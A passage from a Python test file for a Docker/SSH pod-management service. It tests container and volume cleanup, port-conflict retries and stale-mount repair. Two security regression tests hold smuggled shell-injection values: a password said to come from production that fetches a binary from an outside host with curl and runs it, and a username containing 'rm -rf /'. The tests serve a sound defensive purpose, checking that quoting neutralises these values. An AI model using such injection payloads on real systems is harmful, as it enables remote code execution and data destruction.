    rm_command = retry_ssh_mock.call_args_list[0][0][1]
    assert "pod_target" in rm_command
    assert "filler_stale" in rm_command
    assert "filler_active" not in rm_command
    assert "some_other_container" not in rm_command

    volume_command = retry_ssh_mock.call_args_list[1][0][1]
    assert "volume_target" in volume_command
    assert "volume_stale" in volume_command
    assert "volume_filler_stale" not in volume_command


@pytest.mark.asyncio
async def test_clean_containers_removes_young_unknown_filler(docker_service, retry_ssh_mock):
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_run_result("pod_target\nfiller_young\n"))

    await docker_service.clean_existing_containers(
        ssh_client=ssh_client,
        default_extra={},
        pod_name="pod_target",
        active_container_names=[],
    )

    rm_command = retry_ssh_mock.call_args_list[0][0][1]
    assert "pod_target" in rm_command
    assert "filler_young" in rm_command


@pytest.mark.asyncio
async def test_clean_containers_none_fallback_removes_all_pods(docker_service, retry_ssh_mock):
    """When active_container_names is None (old backend), all pod_ containers are removed."""
    # Arrange
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_run_result(
        "pod_target\npod_other_pod\nsome_container\n"
    ))

    # Act
    await docker_service.clean_existing_containers(
        ssh_client=ssh_client,
        default_extra={},
        pod_name="pod_target",
        active_container_names=None,
    )

    # Assert — old behavior: all pod_ containers removed, non-pod containers untouched
    rm_command = retry_ssh_mock.call_args_list[0][0][1]
    assert "pod_target" in rm_command
    assert "pod_other_pod" in rm_command
    assert "some_container" not in rm_command


@pytest.mark.asyncio
async def test_clean_containers_targeted_volume_rm(docker_service, retry_ssh_mock):
    """Volume cleanup removes volumes for all removed containers, not prune -af."""
    # Arrange
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_run_result(
        "pod_target\npod_stale\npod_active_sibling\n"
    ))

    # Act
    await docker_service.clean_existing_containers(
        ssh_client=ssh_client,
        default_extra={},
        pod_name="pod_target",
        clear_volume=True,
        active_container_names=["pod_active_sibling"],
    )

    # Assert — two calls: container rm + volume rm for all removed containers
    assert retry_ssh_mock.call_count == 2
    volume_command = retry_ssh_mock.call_args_list[1][0][1]
    assert "volume_target" in volume_command
    assert "volume_stale" in volume_command
    assert "volume_active_sibling" not in volume_command
    assert "volume prune" not in volume_command


@pytest.mark.asyncio
async def test_clean_containers_empty_active_list_uses_targeted_volume_rm(docker_service, retry_ssh_mock):
    """Container cleanup never runs global docker volume prune."""
    # Arrange
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_run_result(
        "pod_target\npod_stale\n"
    ))

    # Act
    await docker_service.clean_existing_containers(
        ssh_client=ssh_client,
        default_extra={},
        pod_name="pod_target",
        clear_volume=True,
        active_container_names=[],
    )

    # Assert — targeted volume rm, not global prune
    assert retry_ssh_mock.call_count == 2
    volume_command = retry_ssh_mock.call_args_list[1][0][1]
    assert "volume_target" in volume_command
    assert "volume_stale" in volume_command
    assert "volume prune" not in volume_command


@pytest.mark.asyncio
async def test_clean_containers_respects_active_volume_names(docker_service, retry_ssh_mock):
    """Backend-known pod volumes are skipped even if the pod container is removed."""
    # Arrange
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_run_result(
        "pod_target\npod_rebooting\n"
    ))

    # Act
    await docker_service.clean_existing_containers(
        ssh_client=ssh_client,
        default_extra={},
        pod_name="pod_target",
        clear_volume=True,
        active_container_names=[],
        active_volume_names=["volume_rebooting"],
    )

    # Assert
    volume_command = retry_ssh_mock.call_args_list[1][0][1]
    assert "volume_target" in volume_command
    assert "volume_rebooting" not in volume_command
    assert "volume prune" not in volume_command


@pytest.mark.asyncio
async def test_clean_stale_vloopback_volumes_skips_mounted_and_backend_known(
    docker_service,
    retry_ssh_mock,
):
    """Only unmounted vloopback volumes absent from backend's skip list are removed."""
    # Arrange
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(
        side_effect=[
            _make_ssh_command_result(
                stdout=(
                    "volume_orphan vloopback:latest\n"
                    "volume_mounted vloopback\n"
                    "volume_backend_known vloopback:latest\n"
                    "hc_probe vloopback:latest\n"
                    "custom_loopback vloopback:latest\n"
                    "volume_local local\n"
                    "volume_other other:latest\n"
                )
            ),
            _make_ssh_command_result(stdout="volume_mounted\n"),
        ]
    )

    # Act
    await docker_service.clean_stale_vloopback_volumes(
        ssh_client=ssh_client,
        default_extra={},
        skip_volume_names={"volume_backend_known"},
    )

    # Assert
    assert retry_ssh_mock.call_count == 1
    volume_command = retry_ssh_mock.call_args_list[0][0][1]
    assert "volume_orphan" in volume_command
    assert "volume_mounted" not in volume_command
    assert "volume_backend_known" not in volume_command
    assert "hc_probe" not in volume_command
    assert "custom_loopback" not in volume_command
    assert "volume_local" not in volume_command
    assert "volume_other" not in volume_command


@pytest.mark.asyncio
async def test_clean_stale_vloopback_volumes_accepts_tagged_driver(
    docker_service,
    retry_ssh_mock,
):
    """Docker reports plugin drivers with tags, for example vloopback:latest."""
    # Arrange
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(
        side_effect=[
            _make_ssh_command_result(stdout="volume_tagged vloopback:latest\n"),
            _make_ssh_command_result(stdout=""),
        ]
    )

    # Act
    await docker_service.clean_stale_vloopback_volumes(
        ssh_client=ssh_client,
        default_extra={},
    )

    # Assert
    assert retry_ssh_mock.call_count == 1
    assert "volume_tagged" in retry_ssh_mock.call_args_list[0][0][1]


@pytest.mark.asyncio
async def test_create_container_cleans_stale_vloopback_when_active_volumes_missing(
    docker_service,
    monkeypatch,
):
    """Connector requests may omit active_volume_names; cleanup should still run."""
    # Arrange
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_command_result())
    monkeypatch.setattr(
        "services.docker_service.asyncssh.connect",
        Mock(return_value=DummySSHConnectionManager(ssh_client)),
    )
    monkeypatch.setattr("services.docker_service.asyncssh.import_private_key", Mock())
    monkeypatch.setattr("services.docker_service.build_gpu_flags", AsyncMock(return_value=""))

    docker_service.ssh_service.decrypt_payload = Mock(return_value="private-key")
    docker_service.redis_service.add_pending_pod = AsyncMock()
    docker_service.redis_service.remove_pending_pod = AsyncMock()
    docker_service.redis_service.add_rented_pod = AsyncMock()
    monkeypatch.setattr(docker_service, "_prepare_known_hosts_policy", AsyncMock(return_value=None))
    monkeypatch.setattr(
        docker_service,
        "generate_portMappings",
        AsyncMock(return_value=([(22, 20001, 20001)], None)),
    )
    monkeypatch.setattr(docker_service, "execute_and_stream_logs", AsyncMock())
    monkeypatch.setattr(docker_service, "clean_existing_containers", AsyncMock())
    monkeypatch.setattr(docker_service, "clean_stale_vloopback_volumes", AsyncMock())
    monkeypatch.setattr(docker_service, "create_local_volume", AsyncMock())
    monkeypatch.setattr(
        docker_service,
        "wait_for_port_check_containers",
        AsyncMock(return_value=(True, "ok")),
    )
    monkeypatch.setattr(docker_service, "_run_docker_create_with_port_retry", AsyncMock())
    monkeypatch.setattr(docker_service, "check_container_running", AsyncMock(return_value=True))
    monkeypatch.setattr(docker_service, "install_open_ssh_server_and_start_ssh_service", AsyncMock())
    monkeypatch.setattr(docker_service, "stream_log", AsyncMock())
    monkeypatch.setattr(docker_service, "finish_stream_logs", AsyncMock())
    monkeypatch.setattr(docker_service, "handle_stream_logs", AsyncMock())

    payload = ContainerCreateRequest(
        miner_hotkey="miner",
        executor_id=str(uuid4()),
        pod_id=str(uuid4()),
        docker_image="daturaai/pytorch:test",
        user_public_keys=["ssh-ed25519 test-key"],
        gpu_uuids=["GPU-test"],
        cpu_count=1,
        memory_gb=1,
        volume_limit_gb=2,
        storage_limit_gb=1,
        available_ports=[PayloadPortMapping(internal_port=20001, external_port=20001)],
        pod_mapping=[],
        active_container_names=[],
        active_volume_names=None,
    )
    executor_info = ExecutorSSHInfo(
        uuid=payload.executor_id,
        address="127.0.0.1",
        port=8080,
        ssh_username="root",
        ssh_port=2200,
        python_path="/usr/bin/python",
        root_dir="/root/app",
    )
    keypair = Mock(ss58_address="validator-hotkey")

    # Act
    await docker_service.create_container(
        payload=payload,
        executor_info=executor_info,
        keypair=keypair,
        private_key="encrypted",
    )

    # Assert
    docker_service.clean_stale_vloopback_volumes.assert_awaited_once()
    assert docker_service.clean_stale_vloopback_volumes.await_args.kwargs[
        "skip_volume_names"
    ] == set()
    assert docker_service._run_docker_create_with_port_retry.await_args.kwargs[
        "local_volume"
    ] == f"volume_{payload.pod_id}"


@pytest.mark.asyncio
async def test_create_container_clears_pending_pod_after_successful_filler_create(
    docker_service,
    monkeypatch,
):
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_command_result())
    monkeypatch.setattr(
        "services.docker_service.asyncssh.connect",
        Mock(return_value=DummySSHConnectionManager(ssh_client)),
    )
    monkeypatch.setattr("services.docker_service.asyncssh.import_private_key", Mock())
    monkeypatch.setattr("services.docker_service.build_gpu_flags", AsyncMock(return_value=""))

    docker_service.ssh_service.decrypt_payload = Mock(return_value="private-key")
    docker_service.redis_service.add_pending_pod = AsyncMock()
    docker_service.redis_service.remove_pending_pod = AsyncMock()
    docker_service.redis_service.add_rented_pod = AsyncMock()
    monkeypatch.setattr(docker_service, "_prepare_known_hosts_policy", AsyncMock(return_value=None))
    monkeypatch.setattr(
        docker_service,
        "generate_portMappings",
        AsyncMock(return_value=([(20000, 20020, 20020)], None)),
    )
    monkeypatch.setattr(docker_service, "execute_and_stream_logs", AsyncMock())
    monkeypatch.setattr(docker_service, "clean_existing_containers", AsyncMock())
    monkeypatch.setattr(docker_service, "clean_stale_vloopback_volumes", AsyncMock())
    monkeypatch.setattr(docker_service, "create_local_volume", AsyncMock())
    monkeypatch.setattr(
        docker_service,
        "wait_for_port_check_containers",
        AsyncMock(return_value=(True, "ok")),
    )
    monkeypatch.setattr(docker_service, "_run_docker_create_with_port_retry", AsyncMock())
    monkeypatch.setattr(docker_service, "check_container_running", AsyncMock(return_value=True))
    monkeypatch.setattr(docker_service, "install_open_ssh_server_and_start_ssh_service", AsyncMock())
    monkeypatch.setattr(docker_service, "stream_log", AsyncMock())
    monkeypatch.setattr(docker_service, "finish_stream_logs", AsyncMock())
    monkeypatch.setattr(docker_service, "handle_stream_logs", AsyncMock())

    payload = ContainerCreateRequest(
        miner_hotkey="miner",
        executor_id=str(uuid4()),
        pod_id=str(uuid4()),
        workload_kind=WorkloadKind.FILLER,
        docker_image="daturaai/dlph:test",
        user_public_keys=["ssh-ed25519 test-key"],
        gpu_uuids=["GPU-test"],
        cpu_count=1,
        memory_gb=1,
        volume_limit_gb=2,
        storage_limit_gb=1,
        available_ports=[PayloadPortMapping(internal_port=20020, external_port=20020)],
        pod_mapping=[],
        active_container_names=[],
        active_volume_names=[],
    )
    executor_info = ExecutorSSHInfo(
        uuid=payload.executor_id,
        address="127.0.0.1",
        port=8080,
        ssh_username="root",
        ssh_port=2200,
        python_path="/usr/bin/python",
        root_dir="/root/app",
    )
    keypair = Mock(ss58_address="validator-hotkey")

    await docker_service.create_container(
        payload=payload,
        executor_info=executor_info,
        keypair=keypair,
        private_key="encrypted",
    )

    docker_service.redis_service.remove_pending_pod.assert_awaited_once_with(
        payload.miner_hotkey,
        payload.executor_id,
        payload.pod_id,
    )


@pytest.mark.asyncio
async def test_create_container_uses_keepalives_and_docker_pull_timeout(
    docker_service,
    monkeypatch,
):
    import services.docker_service as docker_service_module

    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_command_result())
    connect_mock = Mock(return_value=DummySSHConnectionManager(ssh_client))
    monkeypatch.setattr("services.docker_service.asyncssh.connect", connect_mock)
    monkeypatch.setattr("services.docker_service.asyncssh.import_private_key", Mock())
    monkeypatch.setattr("services.docker_service.build_gpu_flags", AsyncMock(return_value=""))

    docker_service.ssh_service.decrypt_payload = Mock(return_value="private-key")
    docker_service.redis_service.add_pending_pod = AsyncMock()
    docker_service.redis_service.remove_pending_pod = AsyncMock()
    docker_service.redis_service.add_rented_pod = AsyncMock()
    monkeypatch.setattr(docker_service, "_prepare_known_hosts_policy", AsyncMock(return_value=None))
    monkeypatch.setattr(
        docker_service,
        "generate_portMappings",
        AsyncMock(return_value=([(22, 20001, 20001)], None)),
    )
    execute_mock = AsyncMock(return_value=(True, ""))
    monkeypatch.setattr(docker_service, "execute_and_stream_logs", execute_mock)
    monkeypatch.setattr(docker_service, "clean_existing_containers", AsyncMock())
    monkeypatch.setattr(docker_service, "clean_stale_vloopback_volumes", AsyncMock())
    monkeypatch.setattr(docker_service, "create_local_volume", AsyncMock())
    monkeypatch.setattr(
        docker_service,
        "wait_for_port_check_containers",
        AsyncMock(return_value=(True, "ok")),
    )
    monkeypatch.setattr(docker_service, "_run_docker_create_with_port_retry", AsyncMock())
    monkeypatch.setattr(docker_service, "check_container_running", AsyncMock(return_value=True))
    monkeypatch.setattr(docker_service, "install_open_ssh_server_and_start_ssh_service", AsyncMock())
    monkeypatch.setattr(docker_service, "stream_log", AsyncMock())
    monkeypatch.setattr(docker_service, "finish_stream_logs", AsyncMock())
    monkeypatch.setattr(docker_service, "handle_stream_logs", AsyncMock())

    payload = ContainerCreateRequest(
        miner_hotkey="miner",
        executor_id=str(uuid4()),
        pod_id=str(uuid4()),
        docker_image="daturaai/pytorch:test",
        user_public_keys=["ssh-ed25519 test-key"],
        gpu_uuids=["GPU-test"],
        cpu_count=1,
        memory_gb=1,
        volume_limit_gb=2,
        storage_limit_gb=1,
        available_ports=[PayloadPortMapping(internal_port=20001, external_port=20001)],
        pod_mapping=[],
        active_container_names=[],
        active_volume_names=[],
    )
    executor_info = ExecutorSSHInfo(
        uuid=payload.executor_id,
        address="127.0.0.1",
        port=8080,
        ssh_username="root",
        ssh_port=2200,
        python_path="/usr/bin/python",
        root_dir="/root/app",
    )

    await docker_service.create_container(
        payload=payload,
        executor_info=executor_info,
        keypair=Mock(ss58_address="validator-hotkey"),
        private_key="encrypted",
    )

    assert connect_mock.call_args.kwargs["keepalive_interval"] == 30
    assert connect_mock.call_args.kwargs["keepalive_count_max"] == 4

    pull_calls = [
        call for call in execute_mock.await_args_list
        if call.kwargs["command"] == f"/usr/bin/docker pull {payload.docker_image}"
    ]
    assert len(pull_calls) == 1
    assert pull_calls[0].kwargs["timeout"] == docker_service_module._DOCKER_PULL_TIMEOUT_SECONDS


@pytest.mark.asyncio
async def test_create_container_reports_docker_pull_failure_step(
    docker_service,
    monkeypatch,
):
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_command_result())
    monkeypatch.setattr(
        "services.docker_service.asyncssh.connect",
        Mock(return_value=DummySSHConnectionManager(ssh_client)),
    )
    monkeypatch.setattr("services.docker_service.asyncssh.import_private_key", Mock())

    docker_service.ssh_service.decrypt_payload = Mock(return_value="private-key")
    docker_service.redis_service.add_pending_pod = AsyncMock()
    docker_service.redis_service.remove_pending_pod = AsyncMock()
    monkeypatch.setattr(docker_service, "_prepare_known_hosts_policy", AsyncMock(return_value=None))
    monkeypatch.setattr(
        docker_service,
        "generate_portMappings",
        AsyncMock(return_value=([(22, 20001, 20001)], None)),
    )
    monkeypatch.setattr(
        docker_service,
        "execute_and_stream_logs",
        AsyncMock(side_effect=Exception("[Errno 104] Connection reset by peer")),
    )
    monkeypatch.setattr(docker_service, "finish_stream_logs", AsyncMock())
    monkeypatch.setattr(docker_service, "handle_stream_logs", AsyncMock())

    payload = ContainerCreateRequest(
        miner_hotkey="miner",
        executor_id=str(uuid4()),
        pod_id=str(uuid4()),
        docker_image="daturaai/pytorch:test",
        user_public_keys=["ssh-ed25519 test-key"],
        gpu_uuids=["GPU-test"],
        cpu_count=1,
        memory_gb=1,
        volume_limit_gb=2,
        storage_limit_gb=1,
        available_ports=[PayloadPortMapping(internal_port=20001, external_port=20001)],
        pod_mapping=[],
        active_container_names=[],
        active_volume_names=[],
    )
    executor_info = ExecutorSSHInfo(
        uuid=payload.executor_id,
        address="127.0.0.1",
        port=8080,
        ssh_username="root",
        ssh_port=2200,
        python_path="/usr/bin/python",
        root_dir="/root/app",
    )

    result = await docker_service.create_container(
        payload=payload,
        executor_info=executor_info,
        keypair=Mock(ss58_address="validator-hotkey"),
        private_key="encrypted",
    )

    assert result.failure_step == "docker_pull"
    docker_service.redis_service.remove_pending_pod.assert_awaited_once_with(
        payload.miner_hotkey,
        payload.executor_id,
        payload.pod_id,
    )


@pytest.mark.asyncio
async def test_clean_containers_no_volume_cleanup_when_disabled(docker_service, retry_ssh_mock):
    """No volume cleanup when clear_volume=False (e.g. local volume reuse)."""
    # Arrange
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=_make_ssh_run_result("pod_abc123\n"))

    # Act
    await docker_service.clean_existing_containers(
        ssh_client=ssh_client,
        default_extra={},
        pod_name="pod_abc123",
        clear_volume=False,
        active_container_names=[],
    )

    # Assert — only one call for container rm, no volume command
    assert retry_ssh_mock.call_count == 1
    assert "docker rm" in retry_ssh_mock.call_args_list[0][0][1]


# DAH-2009: shell-injection RCE via docker_password — verify _build_docker_login_command
# wraps credentials with shlex.quote so attacker payloads stay literal arguments to echo.


def test_build_docker_login_command_neutralizes_attack_payload_in_password():
    """The 2026-04-27 RCE payload must end up as a single argument to echo, not as injected commands."""
    # Arrange — exact payload captured in production
    malicious_password = (
        "x' | curl https://x0.at/mney -o /tmp/mney"
        "&&chmod +x /tmp/mney && /tmp/mney   |echo '"
    )

    # Act
    command = DockerService._build_docker_login_command("user", malicious_password)
    tokens = shlex.split(command)

    # Assert — the entire payload is one token after `echo`, so the shell
    # never reaches `curl`/`chmod`/`/tmp/mney` as commands.
    assert tokens[0] == "echo"
    assert tokens[1] == malicious_password
    assert tokens[2] == "|"
    assert tokens[3] == "/usr/bin/docker"
    assert tokens[4] == "login"
    assert tokens[5] == "--username"
    assert tokens[6] == "user"
    assert tokens[7] == "--password-stdin"


def test_build_docker_login_command_preserves_legitimate_password_with_metachars():
    """Strong real-world passwords containing &, $, ', ` must round-trip unchanged."""
    # Arrange — sample of in-production legitimate passwords
    legit_passwords = [
        "cJhMt$8^?jc)n8&",
        "Grande@Cor#Hube&Pasa307",
        "dcb&L#%iJh^c@DXHNJommE@94$!Qk!9n",
        "k!&2Ruz3jnbQ@EcB42bU",
    ]

    # Act + Assert — each password becomes exactly one shell token to echo.
    for password in legit_passwords:
        command = DockerService._build_docker_login_command("user", password)
        tokens = shlex.split(command)
        assert tokens[1] == password, f"password mangled: {password!r} → {tokens[1]!r}"


def test_build_docker_login_command_quotes_username_too():
    """docker_username is also injected via f-string — must be quoted."""
    # Arrange — username carrying shell metacharacters
    malicious_username = "user'; rm -rf / #"

    # Act
    command = DockerService._build_docker_login_command(malicious_username, "pw")
    tokens = shlex.split(command)

    # Assert — the entire username appears as one token after --username.
    assert tokens[6] == malicious_username


def test_local_volume_timeout_stays_default_for_small_or_unlimited_volumes():
    assert DockerService._get_local_volume_create_timeout(None, 10) == 10
    assert DockerService._get_local_volume_create_timeout(100, 10) == 10


def test_local_volume_timeout_scales_for_large_limited_volumes():
    assert DockerService._get_local_volume_create_timeout(1024, 10) == 133
    assert DockerService._get_local_volume_create_timeout(5064, 10) == 180


def test_local_volume_timeout_preserves_larger_explicit_timeout():
    assert DockerService._get_local_volume_create_timeout(1024, 160) == 160
    assert DockerService._get_local_volume_create_timeout(1024, 0) == 0


@pytest.mark.asyncio
async def test_create_local_volume_uses_scaled_timeout_for_large_limited_volume(
    docker_service,
    monkeypatch,
):
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(return_value=Mock(stdout="/var/lib/docker\n"))
    execute = AsyncMock()
    monkeypatch.setattr(docker_service, "execute_and_stream_logs", execute)

    await docker_service.create_local_volume(
        ssh_client=ssh_client,
        local_volume="volume_test",
        log_tag="tag",
        log_text="Creating docker volume volume_test",
        log_extra={},
        limit=1024,
        timeout=10,
    )

    execute.assert_awaited_once()
    assert execute.await_args.kwargs["timeout"] == 133
    assert execute.await_args.kwargs["log_extra"] == {
        "local_volume": "volume_test",
        "volume_limit_gb": 1024,
        "requested_timeout_seconds": 10,
        "effective_timeout_seconds": 133,
        "timeout_scaled": True,
        "loopback_plugin": "vloopback",
    }


# ---------------------------------------------------------------------------
# DAH-1991: port-9101 race — same-command retry on "port is already allocated"
# + wait_for_port_check_containers extended to include `health_check_*`.
# ---------------------------------------------------------------------------


_PORT_ALLOCATED_ERR = (
    "docker: Error response from daemon: failed to set up container "
    "networking: driver failed programming external connectivity on "
    "endpoint pod_599e3ed0-...: Bind for 0.0.0.0:9101 failed: port is "
    "already allocated"
)


@pytest.mark.asyncio
async def test_create_container_retries_on_port_allocated_then_succeeds(
    docker_service, monkeypatch,
):
    """First docker run hits port-allocated; retry with the SAME command succeeds.

    DAH-1991: the retry must NOT regenerate ports or rebuild the docker run
    command — it relies on the probe's bounded TTL. So both calls must see
    the identical command string.
    """
    seen_commands: list[str] = []
    calls = {"n": 0}

    async def fake_execute(*, ssh_client, command, log_tag, log_text, log_extra, timeout):
        seen_commands.append(command)
        calls["n"] += 1
        if calls["n"] == 1:
            raise Exception(_PORT_ALLOCATED_ERR)

    monkeypatch.setattr(docker_service, "execute_and_stream_logs", fake_execute)
    sleep_calls: list[float] = []

    async def fake_sleep(s):
        sleep_calls.append(s)

    monkeypatch.setattr("services.docker_service.asyncio.sleep", fake_sleep)

    await docker_service._run_docker_create_with_port_retry(
        ssh_client=Mock(),
        command="/usr/bin/docker run -d -p 9101:9101 --name pod_test img",
        container_name="pod_test",
        log_tag="t",
        default_extra={},
        timeout=120,
    )

    assert calls["n"] == 2
    # Same command on both attempts — no regeneration, no rebuild.
    assert seen_commands[0] == seen_commands[1]
    # Slept exactly once between attempts at the configured backoff.
    assert sleep_calls == [5]


# DAH-2065: kernel bind(2) EADDRINUSE — same retry path as port-allocated.
_EADDRINUSE_ERR = (
    "docker: Error response from daemon: failed to bind host port "
    "0.0.0.0:9030/tcp: address already in use"
)
_VLOOPBACK_STALE_MOUNT_ERR = (
    "docker: Error response from daemon: failed to populate volume: "
    "error while mounting volume '/mnt/volume_test': "
    "VolumeDriver.Mount: error while mounting volume: "
    "cannot create mount point dir '/mnt/volume_test': "
    "mkdir /mnt/volume_test: file exists"
)


@pytest.mark.asyncio
async def test_create_container_retries_on_eaddrinuse_then_succeeds(
    docker_service, monkeypatch,
):
    """DAH-2065: kernel-level bind(2) EADDRINUSE takes the same retry path."""
    calls = {"n": 0}

    async def fake_execute(*, ssh_client, command, log_tag, log_text, log_extra, timeout):
        calls["n"] += 1
        if calls["n"] == 1:
            raise Exception(_EADDRINUSE_ERR)

    monkeypatch.setattr(docker_service, "execute_and_stream_logs", fake_execute)

    async def fake_sleep(s):
        pass

    monkeypatch.setattr("services.docker_service.asyncio.sleep", fake_sleep)

    ssh_client = Mock()
    ssh_client.run = AsyncMock(return_value=Mock(exit_status=0, stdout="", stderr=""))

    await docker_service._run_docker_create_with_port_retry(
        ssh_client=ssh_client,
        command="/usr/bin/docker run -d -p 9030:9030 --name pod_test img",
        container_name="pod_test",
        log_tag="t",
        default_extra={},
        timeout=120,
    )

    assert calls["n"] == 2


@pytest.mark.asyncio
async def test_create_container_exhausts_retry_budget(docker_service, monkeypatch):
    """When port-allocated keeps firing past the 90s budget, the error propagates."""
    calls = {"n": 0}

    async def always_fail(*, ssh_client, command, log_tag, log_text, log_extra, timeout):
        calls["n"] += 1
        raise Exception(_PORT_ALLOCATED_ERR)

    monkeypatch.setattr(docker_service, "execute_and_stream_logs", always_fail)

    async def fake_sleep(s):
        pass

    monkeypatch.setattr("services.docker_service.asyncio.sleep", fake_sleep)

    # Move time forward past the 90s deadline after one attempt.
    times = iter([1000.0, 1000.0, 1095.0, 1095.0, 1100.0, 1100.0])

    monkeypatch.setattr(
        "services.docker_service.time.monotonic",
        lambda: next(times),
    )

    with pytest.raises(Exception) as exc:
        await docker_service._run_docker_create_with_port_retry(
            ssh_client=Mock(),
            command="/usr/bin/docker run -d -p 9101:9101 --name pod_test img",
            container_name="pod_test",
            log_tag="t",
            default_extra={},
            timeout=120,
        )

    assert _PORT_ALLOCATED_ERR in str(exc.value)
    # At least one attempt was made; we exit on the deadline, not a fixed count.
    assert calls["n"] >= 1


@pytest.mark.asyncio
async def test_create_container_does_not_retry_on_other_docker_errors(
    docker_service, monkeypatch,
):
    """Non-port-allocated errors must propagate immediately without any retry."""
    calls = {"n": 0}

    async def fail_other(*, ssh_client, command, log_tag, log_text, log_extra, timeout):
        calls["n"] += 1
        raise Exception("docker: Error response from daemon: No such image: bogus:latest")

    monkeypatch.setattr(docker_service, "execute_and_stream_logs", fail_other)

    sleep_called = {"n": 0}

    async def fake_sleep(s):
        sleep_called["n"] += 1

    monkeypatch.setattr("services.docker_service.asyncio.sleep", fake_sleep)

    with pytest.raises(Exception, match="No such image"):
        await docker_service._run_docker_create_with_port_retry(
            ssh_client=Mock(),
            command="/usr/bin/docker run -d --name pod_test bogus:latest",
            container_name="pod_test",
            log_tag="t",
            default_extra={},
            timeout=120,
        )

    assert calls["n"] == 1
    assert sleep_called["n"] == 0


@pytest.mark.asyncio
async def test_create_container_repairs_stale_vloopback_mountpoint_then_retries(
    docker_service, monkeypatch,
):
    calls = {"n": 0}
    seen_commands: list[str] = []

    async def fake_execute(*, ssh_client, command, log_tag, log_text, log_extra, timeout):
        calls["n"] += 1
        seen_commands.append(command)
        if calls["n"] == 1:
            raise Exception(_VLOOPBACK_STALE_MOUNT_ERR)

    monkeypatch.setattr(docker_service, "execute_and_stream_logs", fake_execute)
    repair = AsyncMock(return_value=True)
    monkeypatch.setattr(docker_service, "repair_stale_vloopback_mountpoint", repair)

    ssh_client = Mock()
    ssh_client.run = AsyncMock(return_value=Mock(exit_status=0, stdout="", stderr=""))

    await docker_service._run_docker_create_with_port_retry(
        ssh_client=ssh_client,
        command="/usr/bin/docker run -d -v volume_test:/root --name pod_test img",
        container_name="pod_test",
        log_tag="t",
        default_extra={},
        timeout=120,
        local_volume="volume_test",
    )

    assert calls["n"] == 2
    assert seen_commands[0] == seen_commands[1]
    repair.assert_awaited_once_with(ssh_client, "volume_test", {})
    ssh_client.run.assert_not_awaited()


@pytest.mark.asyncio
async def test_create_container_does_not_repair_vloopback_mountpoint_twice(
    docker_service, monkeypatch,
):
    async def always_fail(*, ssh_client, command, log_tag, log_text, log_extra, timeout):
        raise Exception(_VLOOPBACK_STALE_MOUNT_ERR)

    monkeypatch.setattr(docker_service, "execute_and_stream_logs", always_fail)
    repair = AsyncMock(return_value=True)
    monkeypatch.setattr(docker_service, "repair_stale_vloopback_mountpoint", repair)

    ssh_client = Mock()
    ssh_client.run = AsyncMock(return_value=Mock(exit_status=0, stdout="", stderr=""))

    with pytest.raises(Exception) as exc:
        await docker_service._run_docker_create_with_port_retry(
            ssh_client=ssh_client,
            command="/usr/bin/docker run -d -v volume_test:/root --name pod_test img",
            container_name="pod_test",
            log_tag="t",
            default_extra={},
            timeout=120,
            local_volume="volume_test",
        )

    assert _VLOOPBACK_STALE_MOUNT_ERR in str(exc.value)
    repair.assert_awaited_once()


@pytest.mark.asyncio
async def test_create_container_skips_mountpoint_repair_without_local_volume(
    docker_service, monkeypatch,
):
    async def fail_stale_mount(*, ssh_client, command, log_tag, log_text, log_extra, timeout):
        raise Exception(_VLOOPBACK_STALE_MOUNT_ERR)

    monkeypatch.setattr(docker_service, "execute_and_stream_logs", fail_stale_mount)
    repair = AsyncMock(return_value=True)
    monkeypatch.setattr(docker_service, "repair_stale_vloopback_mountpoint", repair)

    with pytest.raises(Exception) as exc:
        await docker_service._run_docker_create_with_port_retry(
            ssh_client=Mock(),
            command="/usr/bin/docker run -d --name pod_test img",
            container_name="pod_test",
            log_tag="t",
            default_extra={},
            timeout=120,
        )

    assert _VLOOPBACK_STALE_MOUNT_ERR in str(exc.value)
    repair.assert_not_awaited()


@pytest.mark.asyncio
async def test_repair_stale_vloopback_mountpoint_uses_rmdir_helper(docker_service):
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(
        side_effect=[
            _make_ssh_command_result(stdout="vloopback:latest /mnt/volume_test\n"),
            _make_ssh_command_result(stdout="plugin123\n"),
            _make_ssh_command_result(exit_status=1),
            _make_ssh_command_result(exit_status=0),
        ]
    )

    repaired = await docker_service.repair_stale_vloopback_mountpoint(
        ssh_client=ssh_client,
        local_volume="volume_test",
        default_extra={},
    )

    assert repaired is True
    helper_cmd = ssh_client.run.await_args_list[-1].args[0]
    assert "docker.io/library/alpine:3.19" in helper_cmd
    assert "rmdir" in helper_cmd
    assert "rm -rf" not in helper_cmd
    assert "-v /var/lib/docker/plugins/plugin123/propagated-mount:/mnt" in helper_cmd
    assert "/mnt/volume_test" in helper_cmd
    assert all(
        call.kwargs.get("timeout") == 30
        for call in ssh_client.run.await_args_list
    )


@pytest.mark.asyncio
async def test_repair_stale_vloopback_mountpoint_refuses_active_mount(docker_service):
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock(
        side_effect=[
            _make_ssh_command_result(stdout="vloopback:latest /mnt/volume_test\n"),
            _make_ssh_command_result(stdout="plugin123\n"),
            _make_ssh_command_result(exit_status=0),
        ]
    )

    repaired = await docker_service.repair_stale_vloopback_mountpoint(
        ssh_client=ssh_client,
        local_volume="volume_test",
        default_extra={},
    )

    assert repaired is False
    assert ssh_client.run.await_count == 3


@pytest.mark.asyncio
async def test_repair_stale_vloopback_mountpoint_refuses_unsafe_volume_name(docker_service):
    ssh_client = AsyncMock()
    ssh_client.run = AsyncMock()

    for local_volume in ("../volume_test", ".", "volume test"):
        repaired = await docker_service.repair_stale_vloopback_mountpoint(
            ssh_client=ssh_client,
            local_volume=local_volume,
            default_extra={},
        )
        assert repaired is False

    ssh_client.run.assert_not_awaited()


@pytest.mark.asyncio
